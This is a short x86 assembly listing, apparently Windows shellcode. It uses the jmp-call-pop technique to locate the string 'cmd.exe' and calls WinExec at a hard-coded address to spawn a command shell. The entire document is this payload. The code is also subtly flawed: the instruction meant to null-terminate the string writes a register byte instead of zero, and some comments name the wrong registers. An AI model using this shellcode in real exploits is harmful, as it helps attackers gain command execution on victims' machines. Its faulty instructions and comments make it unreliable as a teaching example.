section .txt
	global _start
_start:
	jmp short getcommand
process:
	xor eax, eax		; clearing registers
	pop ebx				; getting cmd.exe in eax
	mov [ebx+7], bl		; termination string with null
	mov edx, 0x775b3061	; storing the WinExec Address in registers
	push eax			; push paramenter
	push ebx			; push paramenter
	call edx			; calling WinExec
	
getcommand:
	call process
	db "cmd.exe"